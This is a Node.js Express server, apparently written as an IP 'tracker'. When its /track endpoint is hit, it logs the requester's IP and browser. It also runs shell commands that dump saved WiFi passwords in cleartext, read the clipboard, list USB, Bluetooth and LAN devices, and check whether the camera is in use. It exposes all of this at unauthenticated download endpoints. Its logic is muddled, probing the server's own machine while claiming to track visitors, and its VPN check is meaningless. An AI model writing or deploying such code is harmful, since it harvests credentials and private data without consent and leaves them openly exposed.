const express = require("express");
const os = require("os");
const { execSync } = require("child_process");
const useragent = require("useragent");
const fs = require("fs");

const app = express();
const PORT = 3000;
const FILE_PATH = "tracked_ips.json";
const IMAGE_LIFETIME = 30000;

if (!fs.existsSync(FILE_PATH)) fs.writeFileSync(FILE_PATH, JSON.stringify([], null, 4));

app.use(express.static(__dirname));

function scanLAN() {
    let devices = [];
    try {
        const arpOutput = execSync("arp -a", { encoding: "utf-8" });
        const lines = arpOutput.split("\n");

        lines.forEach((line) => {
            const match = line.match(/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+([a-fA-F0-9:-]+)/);
            if (match) {
                devices.push({ ip: match[1], mac: match[2], hostname: "Unknown" });
            }
        });
    } catch (err) {}
    return devices;
}

function checkVPN() {
    try {
        const dnsServers = execSync("nslookup -type=NS google.com", { encoding: "utf-8" });
        if (dnsServers.includes("cloudflare") || dnsServers.includes("opendns"))
            return "Possible VPN/Proxy";
    } catch {}
    return "No VPN Detected";
}

function getCamMicStatus() {
    try {
        const camStatus = execSync("lsof | grep /dev/video", { encoding: "utf-8" }).split("\n").length > 1;
        return camStatus ? "Camera/Microphone in use" : "Not in use";
    } catch {
        return "Unknown";
    }
}

function getBluetoothDevices() {
    try {
        return execSync("bluetoothctl devices", { encoding: "utf-8" }).split("\n");
    } catch {
        return ["Unknown"];
    }
}

function getClipboardData() {
    try {
        return execSync("pbpaste || xclip -o", { encoding: "utf-8" }).trim();
    } catch {
        return "Clipboard access denied";
    }
}

function getUSBDevices() {
    try {
        return execSync("lsusb || system_profiler SPUSBDataType", { encoding: "utf-8" }).split("\n");
    } catch {
        return ["Unknown"];
    }
}

function getOpenApps() {
    try {
        return execSync("tasklist || ps -aux", { encoding: "utf-8" }).split("\n").slice(0, 10);
    } catch {
        return ["Unknown"];
    }
}

function getWiFiPasswords() {
    try {
        return execSync("netsh wlan show profile key=clear", { encoding: "utf-8" }).split("\n");
    } catch {
        return ["Unknown"];
    }
}

app.get("/track", async (req, res) => {
    const publicIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    const networkInterfaces = os.networkInterfaces();
    let localIP = "Unknown";
    let macAddress = "Unknown";
    let deviceName = os.hostname();

    for (const iface of Object.values(networkInterfaces)) {
        for (const config of iface) {
            if (!config.internal && config.family === "IPv4") {
                localIP = config.address;
                macAddress = config.mac;
            }
        }
    }

    const agent = useragent.parse(req.headers["user-agent"]);
    const deviceInfo = {
        os: agent.os.toString(),
        browser: agent.toAgent(),
        platform: agent.device.toString(),
        screen_size: req.headers["sec-ch-ua-platform"] || "Unknown",
    };

    const vpnStatus = checkVPN();
    const camMicStatus = getCamMicStatus();
    const bluetoothDevices = getBluetoothDevices();
    const clipboardData = getClipboardData();
    const usbDevices = getUSBDevices();
    const openApps = getOpenApps();
    const wifiPasswords = getWiFiPasswords();
    const lanDevices = scanLAN();

    const newEntry = {
        timestamp: new Date().toISOString(),
        public_ip: publicIP,
        local_ip: localIP,
        device_name: deviceName,
        mac_address: macAddress,
        vpn_status: vpnStatus,
        cam_mic_status: camMicStatus,
        bluetooth_devices: bluetoothDevices,
        clipboard_data: clipboardData,
        usb_devices: usbDevices,
        open_apps: openApps,
        wifi_passwords: wifiPasswords,
        lan_devices: lanDevices,
    };

    const existingData = JSON.parse(fs.readFileSync(FILE_PATH, "utf8"));
    existingData.push(newEntry);
    fs.writeFileSync(FILE_PATH, JSON.stringify(existingData, null, 4));

    res.json(newEntry);
});

app.get("/download", (req, res) => {
    res.download(FILE_PATH, "tracked_ips.json");
});

// New endpoint to view tracked IP info in JSON format
app.get("/tracked_ips", (req, res) => {
    const existingData = JSON.parse(fs.readFileSync(FILE_PATH, "utf8"));
    res.json(existingData);
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
